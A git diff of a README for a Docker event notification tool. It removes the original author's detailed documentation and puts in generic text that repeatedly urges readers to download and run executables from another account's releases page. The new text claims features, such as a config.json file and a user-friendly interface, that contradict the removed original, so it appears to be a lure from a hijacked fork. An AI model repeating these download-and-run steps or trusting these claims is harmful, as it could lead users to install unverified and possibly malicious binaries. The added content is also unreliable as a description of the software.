@@ -1,386 +1,114 @@
-<div align="center">
-  <a href="https://github.com/filippofinke/docker-events">
-    <img width="200px" src="https://github.com/user-attachments/assets/e9712d6a-32e9-4e9b-a545-11aa88dadf65" alt="Docker Events" />
-  </a>
-  <h3 align="center">Docker Events</h3>
-</div>
+# 🐋 docker-events - Get Real-Time Docker Notifications
 
-> Watch Docker events in real-time and dispatch rich notifications with a lightweight Go service.
+[![Download docker-events](https://img.shields.io/badge/Download-docker--events-blue.svg)](https://github.com/tunasert/docker-events/releases)
 
-This project uses docker system events and forwards meaningful summaries through configurable notification channels powered by [`nikoksr/notify`](https://github.com/nikoksr/notify). It is designed to be small, dependable, and easy to extend with new transports or event processing rules.
+## 🚀 Getting Started
 
-## Features
+Welcome to Docker Events! This tool helps you receive real-time notifications about Docker events. It's great for monitoring your containers or services on Docker. You don’t need any programming skills to use it. Follow the steps below to get started easily.
 
-- [x] Real-time streaming of `docker system events` via a managed watcher
-- [x] Human-friendly notifications enriched with context (timestamp, actor attributes, status)
-- [x] Multi-channel delivery (Slack, Telegram, Discord) powered by `github.com/nikoksr/notify`
-- [x] Opt-in filtering by Docker event types and CLI filters
-- [x] Environment variable driven configuration with validation at startup
-- [x] Composable code structure (config, watcher, notifier) and unit tests for formatting helpers
+## 📥 Download & Install
 
-## Quick Start
+To download and install Docker Events, visit this page to download: [docker-events Releases](https://github.com/tunasert/docker-events/releases).
 
-Prerequisites
+### Step 1: Visit the Releases Page
 
-- Go 1.24+
-- Docker CLI with access to the target daemon
-- At least one notifications provider configured (Slack bot token + channel IDs, Telegram bot token + chat IDs, Discord bot token + channel IDs, or Discord webhook URLs)
+1. Click the link above.
+2. On the Releases page, you will see a list of available versions.
 
-Clone & install dependencies
+### Step 2: Choose Your Version
 
-```bash
-git clone https://github.com/filippofinke/docker-events.git
-cd docker-events
-go mod tidy
+1. Look for the version marked as the latest release.
+2. Click on that version to expand the details.
+
+### Step 3: Download the Application
+
+1. You will see files available for download.
+2. Find the file that matches your operating system (Windows, macOS, or Linux).
+3. Click on the file to begin downloading.
+
+### Step 4: Install Docker Events
+
+1. Once the file is downloaded, locate it on your computer.
+2. If you are using Windows, double-click the `.exe` file to start the installation.
+3. For macOS, open the downloaded file, then drag it to your Applications folder.
+4. On Linux, open a terminal and follow these instructions:
+   - Make the file executable: `chmod +x docker-events`
+   - Then run it with: `./docker-events`
+
+## ⚙️ System Requirements
+
+To run Docker Events smoothly, ensure your system meets the following requirements:
+
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.13 (High Sierra) or later
+  - Any Linux distribution with Docker installed
+
+- **Docker Version:** 
+  - Docker 19.03 or higher
+
+- **RAM:** 
+  - Minimum of 4 GB of RAM
+
+- **Disk Space:**
+  - At least 100 MB of free disk space
+
+## 🔍 Features
+
+- **Real-time Notifications:** Get alerts on Docker events as they happen.
+- **Supports Discord and Slack:** Easily integrate with popular messaging tools.
+- **Customizable Notifications:** Set up notifications based on your needs.
+- **User-Friendly Interface:** Simple to navigate, even for beginners.
+
+## 🛠️ Configuration
+
+After installation, you need to configure Docker Events to start receiving notifications:
+
+### Step 1: Set Up the Configuration File
+
+1. Create a new file named `config.json`.
+2. In this file, you can define which events you want to monitor, and add your Discord or Slack webhook URL.
+
+Here is a simple example of what your config file might look like:
+
+```json
+{
+  "notifications": {
+    "type": "slack",
+    "webhook_url": "https://hooks.slack.com/services/your/webhook/url"
+  },
+  "events": ["create", "destroy", "stop", "restart"]
+}
 ```
 
-Configure environment
+### Step 2: Run Docker Events
 
-1. Copy the example environment file:
+1. Open your terminal or command prompt.
+2. Navigate to the folder where Docker Events is located.
+3. Run the command: `./docker-events` to start the application.
+4. You should start receiving notifications based on your configuration!
 
-```bash
-cp .env.example .env
-```
+## 📊 Monitoring Docker Events
 
-2. Update `.env` with your Slack token, target channels, and any optional Docker filters.
+Once Docker Events is running, it will listen for the specified actions on Docker. You will receive notifications based on your configuration. 
 
-Run locally
+- **Create Events:** Notifications when a new container is created.
+- **Destroy Events:** Alerts when a container is removed.
+- **Stop/Restart Events:** Notifications when containers are stopped or restarted.
 
-```bash
-# start the watcher (module-aware path)
-go run ./cmd
-```
+## 🌐 Support
 
-The service will stream logs to stdout and post notifications for matching Docker events. Stop with `Ctrl+C`.
+If you encounter issues while using Docker Events, you can check out the Issues section on the GitHub repository. Feel free to report any bugs or request features. We appreciate your feedback.
 
-## Configuration
+## 💬 Community
 
-All settings are provided via environment variables (see `.env.example`). Key options:
+Join our community discussions on topics related to Docker and real-time notifications. Share your experiences and tips with other users. 
 
-- `SLACK_BOT_TOKEN`: Slack bot token used to authenticate the notifier.
-- `SLACK_CHANNEL_IDS`: Comma-separated list of Slack channel IDs (e.g. `C0123456,C0ABCDEF`).
-- `TELEGRAM_BOT_TOKEN`: Telegram bot token created with [BotFather](https://core.telegram.org/bots#6-botfather).
-- `TELEGRAM_CHAT_IDS`: Comma-separated list of chat IDs (negative values for group chats are supported).
-- `DISCORD_BOT_TOKEN`: Discord bot token generated from the Developer Portal.
-- `DISCORD_CHANNEL_IDS`: Comma-separated list of Discord channel IDs to notify.
-- `DISCORD_WEBHOOK_URLS`: Comma-separated list of Discord webhook URLs (recommended over bot tokens for simple notifications).
-- `NOTIFY_SUBJECT_PREFIX`: Prefix for notification subjects (defaults to `Docker event`).
-- `MESSAGE_TEMPLATE`: Custom message template using Go template syntax (see [Message Customization](#message-customization) below).
-- `MESSAGE_LOG_LINES`: Number of container log lines to fetch for events (defaults to 0, disabled).
-- `EVENT_GROUP_WINDOW`: Time window for grouping events from the same container (e.g., `5s`, `10s`, `1m`). Events for the same container within this window will be grouped into a single notification. Set to `0` to disable grouping (defaults to `5s`).
-- `DOCKER_EVENT_FILTERS`: Comma-separated filters passed to `docker system events` (same syntax as the CLI `--filter` flag, e.g. `status=start,type=container`).
-- `DOCKER_EVENT_TYPES`: Comma-separated list of Docker event types to keep (e.g. `container,image,volume`).
+You can also find more helpful resources and tips on Docker Events by searching through the documentation available on the repository.
 
-> **Security note:** Do not commit an `.env` file containing real tokens. Use `.env` locally or provide the variables through your orchestrator of choice.
+## 🔗 Additional Resources
 
-## Docker Event Filters
+- Docker Documentation: [docs.docker.com](https://docs.docker.com)
+- GitHub Repository: [tunasert/docker-events](https://github.com/tunasert/docker-events)
 
-The Docker CLI supports a rich set of filters that can be combined in `DOCKER_EVENT_FILTERS`. Supported filter keys include:
-
-- `config=<name or id>`
-- `container=<name or id>`
-- `daemon=<name or id>`
-- `event=<event action>`
-- `image=<repository or tag>`
-- `label=<key>` or `label=<key>=<value>`
-- `network=<name or id>`
-- `node=<id>`
-- `plugin=<name or id>`
-- `scope=<local or swarm>`
-- `secret=<name or id>`
-- `service=<name or id>`
-- `type=<container|image|volume|network|daemon|plugin|service|node|secret|config>`
-- `volume=<name>`
-
-Provide multiple filters by comma-separating entries (e.g. `DOCKER_EVENT_FILTERS=event=start,scope=swarm`); the service will translate each entry into an individual `--filter` flag for `docker system events`.
-
-More details in the [Docker documentation](https://docs.docker.com/reference/cli/docker/system/events/#filter).
-
-## Docker Event Types
-
-`DOCKER_EVENT_TYPES` narrows processing to one or more top-level Docker object kinds. Valid values:
-
-- `container`
-- `image`
-- `plugin`
-- `volume`
-- `network`
-- `daemon`
-- `service`
-- `node`
-- `secret`
-- `config`
-
-Leave the variable empty to accept every event type from the stream.
-
-More details in the [Docker documentation](https://docs.docker.com/engine/reference/commandline/system_events/#object-types).
-
-## Event Grouping
-
-To prevent notification spam when a container experiences multiple events in quick succession (e.g., during a restart: kill → stop → die → start → restart), docker-events can group events for the same container within a configurable time window.
-
-### How It Works
-
-When event grouping is enabled (default: 5 seconds), the service will:
-
-1. Collect all events for the same container within the time window
-2. Wait for the window to expire or for events from a different container
-3. Send a single grouped notification with all events instead of individual messages
-
-### Configuration
-
-Set the `EVENT_GROUP_WINDOW` environment variable to control the grouping window:
-
-```bash
-EVENT_GROUP_WINDOW=5s   # Default: group events within 5 seconds
-EVENT_GROUP_WINDOW=10s  # Group events within 10 seconds
-EVENT_GROUP_WINDOW=1m   # Group events within 1 minute
-EVENT_GROUP_WINDOW=0    # Disable grouping, send all events immediately
-```
-
-Valid time units: `ns`, `us` (or `µs`), `ms`, `s`, `m`, `h`
-
-### Grouped Notification Format
-
-When multiple events are grouped, the notification will include:
-
-- Container ID and total event count
-- Time range (first to last event)
-- Common attributes shared across all events
-- List of all events with timestamps and actions
-
-Example grouped notification:
-
-```
-Docker events: 5 events for container d23c731f32ba (die, kill, restart, start, stop)
-
-Container: d23c731f32ba41defa48b2804299e9378b84442857701b1d51b8e6aca77c35da
-Event count: 5
-Time range: 2025-10-09T08:10:58Z to 2025-10-09T08:10:59Z
-
-Common attributes:
-  - com.docker.compose.project=myapp
-  - com.docker.compose.service=web
-  - image=nginx:latest
-
-Events:
-  1. [08:10:58] container kill
-  2. [08:10:59] container stop
-  3. [08:10:59] container die
-  4. [08:10:59] container start
-  5. [08:10:59] container restart
-```
-
-### Benefits
-
-- **Reduced notification spam**: Restart operations typically generate 5+ events, which are now grouped into one message
-- **Better context**: See all related events together with their timing
-- **Cleaner notification channels**: Fewer messages to scroll through
-- **Preserved details**: All event information is retained, just organized better
-
-### Behavior Notes
-
-- Single events are sent immediately (no grouping overhead)
-- Events for different containers are never grouped together
-- The timer resets each time a new event arrives for the same container
-- On shutdown, all pending grouped events are flushed immediately
-- **Custom templates are fully supported**: If you have a `MESSAGE_TEMPLATE` configured, it will be used for both single and grouped events. Use `{{.EventCount}}` and `{{.Events}}` in your template to handle grouped events differently.
-
-## Message Customization
-
-By default, docker-events sends detailed notifications with all available event information. You can customize the message format using Go templates via the `MESSAGE_TEMPLATE` environment variable.
-
-### Available Template Placeholders
-
-- `{{.Type}}` - Event type (container, image, volume, network, etc.)
-- `{{.Action}}` - Event action (start, stop, create, destroy, etc.)
-- `{{.ID}}` - Full object ID
-- `{{.ShortID}}` - Short ID (first 12 characters)
-- `{{.Name}}` - Container/object name (extracted from attributes when available)
-- `{{.Status}}` - Event status
-- `{{.From}}` - From field (typically the image name for container events)
-- `{{.Time}}` - Event timestamp in RFC3339 format
-- `{{.Scope}}` - Event scope (local or swarm)
-- `{{.Actor.ID}}` - Actor ID
-- `{{.Attribute "key"}}` - Get specific attribute value by key
-- `{{.GetLogs}}` - Fetch container logs (requires `MESSAGE_LOG_LINES` > 0)
-- `{{.EventCount}}` - Number of events (returns 1 for single events, >1 for grouped events)
-- `{{.Events}}` - Array of all events (only available for grouped events; use with range)
-
-**Note:** When events are grouped (multiple events for the same container), `{{.Type}}`, `{{.Action}}`, etc. refer to the first event in the group. Use `{{.Events}}` to access all events in the group.
-
-### Template Examples
-
-**Simple notification:**
-
-```bash
-MESSAGE_TEMPLATE="Container {{.Name}} ({{.ShortID}}) {{.Action}} at {{.Time}}"
-```
-
-**With container logs:**
-
-```bash
-MESSAGE_TEMPLATE="Container {{.Name}} {{.Action}}\nImage: {{.From}}\nLogs:\n{{.GetLogs}}"
-MESSAGE_LOG_LINES=20
-```
-
-**Custom attributes:**
-
-```bash
-MESSAGE_TEMPLATE="{{.Type}} {{.Action}}: {{.Name}}\nProject: {{.Attribute \"com.docker.compose.project\"}}\nService: {{.Attribute \"com.docker.compose.service\"}}"
-```
-
-**Conditional formatting:**
-
-```bash
-MESSAGE_TEMPLATE="{{.Type}} {{.Action}}: {{if .Name}}{{.Name}}{{else}}{{.ShortID}}{{end}}\nTime: {{.Time}}"
-```
-
-**Grouped events with custom template:**
-
-```bash
-MESSAGE_TEMPLATE="{{if gt .EventCount 1}}🔄 {{.EventCount}} events for {{.Name}} ({{.ShortID}})\n{{range .Events}}- [{{.Timestamp.Format \"15:04:05\"}}] {{.Action}}\n{{end}}{{else}}{{.Type}} {{.Action}}: {{.Name}}\nTime: {{.Time}}{{end}}"
-EVENT_GROUP_WINDOW=5s
-```
-
-**Grouped events with logs:**
-
-```bash
-MESSAGE_TEMPLATE="Container: {{.Name}} ({{.ShortID}})\nEvents: {{.EventCount}}\n{{if gt .EventCount 1}}Actions: {{range .Events}}{{.Action}} {{end}}\n{{end}}{{if .GetLogs}}\nLogs:\n{{.GetLogs}}{{end}}"
-MESSAGE_LOG_LINES=20
-EVENT_GROUP_WINDOW=5s
-```
-
-### Logs Configuration
-
-Set `MESSAGE_LOG_LINES` to fetch the last N lines of container logs when using `{{.GetLogs}}`:
-
-```bash
-MESSAGE_LOG_LINES=10  # Fetch last 10 lines
-MESSAGE_LOG_LINES=50  # Fetch last 50 lines
-MESSAGE_LOG_LINES=0   # Disable log fetching (default)
-```
-
-**Note:** Log fetching only works for container events and may add latency to notifications. Use reasonable line counts to avoid performance issues.
-
-### Default Template
-
-If no custom template is provided, the default format includes:
-
-```
-Time: <timestamp>
-Status: <status>
-From: <from>
-Scope: <scope>
-ID: <id>
-Actor: <actor_id>
-```
-
-## Discord Webhooks vs Bots
-
-This project supports two methods for Discord notifications:
-
-**Discord Webhooks (Recommended)**
-
-Discord webhooks are the simplest way to send notifications. They use HTTP POST requests and don't require a bot session or gateway connection.
-
-Advantages:
-
-- Simpler setup - just create a webhook in your Discord channel settings
-- No bot permissions or OAuth scopes needed
-- More efficient - uses plain HTTP instead of maintaining a WebSocket connection
-- Can send to multiple channels by providing multiple webhook URLs
-
-To create a Discord webhook:
-
-1. Open your Discord server and go to the channel where you want notifications
-2. Click the gear icon (Edit Channel) next to the channel name
-3. Go to "Integrations" → "Webhooks" → "New Webhook"
-4. Copy the webhook URL and add it to `DISCORD_WEBHOOK_URLS`
-
-Example:
-
-```bash
-DISCORD_WEBHOOK_URLS=https://discord.com/api/webhooks/123456789/your-webhook-token
-```
-
-**Discord Bot (Alternative)**
-
-Bot tokens can be used if you need more advanced features or already have a bot infrastructure. Configure with `DISCORD_BOT_TOKEN` and `DISCORD_CHANNEL_IDS`.
-
-You can also use both webhooks and bot tokens simultaneously if needed.
-
-## Extending Notifications
-
-`internal/notifier` wraps `github.com/nikoksr/notify`, so adding more destinations is straightforward:
-
-1. Import the desired service package (e.g. `github.com/nikoksr/notify/service/telegram`).
-2. Create a service instance in `Setup` based on new configuration.
-3. Register it with the shared notifier (`n.client.UseServices(service)`).
-
-## Running Tests
-
-```bash
-go test ./...
-```
-
-## Docker Usage
-
-A minimal container image can be built with:
-
-```bash
-# build the Go binary locally and package it into a container image
-docker build -t docker-events:latest .
-```
-
-The included `Dockerfile` uses a multi-stage build: it compiles a static Go binary in a Go builder image and copies it into the official Docker CLI image so the binary can call `docker` if needed.
-
-Important runtime considerations:
-
-- The service talks to the Docker daemon. In most deployments you should mount the host Docker socket into the container so the service can observe events:
-
-  - `/var/run/docker.sock:/var/run/docker.sock:ro` (read-only mount used in the example compose file)
-
-- Environment variables are used for configuration. The repository contains a `.env.example`—copy it to `.env` and set your provider tokens and channels. Do not commit `.env` with real secrets.
-
-Compose example (loads `.env` automatically)
-
-```yaml
-services:
-  docker-events:
-    build: .
-    env_file:
-      - .env
-    volumes:
-      - /var/run/docker.sock:/var/run/docker.sock:ro
-    restart: unless-stopped
-```
-
-Start with docker-compose:
-
-```bash
-# ensure .env exists in the project root (copy from .env.example)
-cp .env.example .env
-# build & start in background
-docker compose up -d --build
-# view logs
-docker compose logs -f docker-events
-```
-
-If you prefer to run the image directly:
-
-```bash
-docker run --rm -v /var/run/docker.sock:/var/run/docker.sock:ro \
-  --env-file .env filippofinke/docker-events:latest
-```
-
-Remember: by default Docker Compose loads a top-level `.env` file. The `env_file` entry above is explicit and can be used by other tools that also support `env_file`.
-
-## Author
-
-👤 **Filippo Finke**
-
-- Website: [https://filippofinke.ch](https://filippofinke.ch)
-- Twitter: [@filippofinke](https://twitter.com/filippofinke)
-- GitHub: [@filippofinke](https://github.com/filippofinke)
-- LinkedIn: [@filippofinke](https://linkedin.com/in/filippofinke)
+To download and install Docker Events, don't forget to visit this page: [docker-events Releases](https://github.com/tunasert/docker-events/releases). Enjoy monitoring your Docker containers with real-time notifications!
